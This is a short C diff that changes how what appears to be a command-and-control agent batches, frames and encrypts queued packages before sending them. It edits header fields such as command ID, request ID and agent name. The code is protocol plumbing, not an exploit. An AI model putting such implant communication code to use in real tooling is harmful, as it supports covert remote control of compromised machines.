@@ -53,7 +53,6 @@ pPackage CreatePackageWithMetaData(UINT32 CommandID) {
 		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
 		return NULL;
 	}
-
 	if ((err = AddStringToPackage(pack, agent->config->AgentName)) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add string to package. %s\n", PackageErrorToString(err));
 		return NULL;
@@ -371,15 +370,13 @@ BOOL PackageSendAll(OUT pDataBuffer Response, OUT PSIZE_T Size)
 	//coalesce all waiting packages into one big pacakge.
 	while (AgentPackList)
 	{
-		AddInt32ToPackage(pack, AgentPackList->CommandID);
-		AddInt32ToPackage(pack, AgentPackList->RequestID);
 		AddBytesToPackage(pack, AgentPackList->Buffer, AgentPackList->Length);
 		AgentPackList->Sent = TRUE;
 		PrevPackage = AgentPackList;
 		AgentPackList = AgentPackList->Next;
 		NumPackages++;
 	}
-	AddInt32ToBuffer(pack->Buffer, pack->Length - sizeof(UINT32));
+	AddInt32ToBuffer(pack->Buffer, pack->Length);
 	/*
  *  Header:
  *  [ SIZE         ] 4 bytes
@@ -388,6 +385,7 @@ BOOL PackageSendAll(OUT pDataBuffer Response, OUT PSIZE_T Size)
  *  [ COMMAND ID   ] 4 bytes
  *  [ Request ID   ] 4 bytes
  *  [ Agent Name   ] size + bytes
+ *  [ Data		   ] size + bytes
 */
 	Offset = (sizeof(UINT32) * 6) + StringLengthA(agent->config->AgentName);
 	//encrypt the big package.
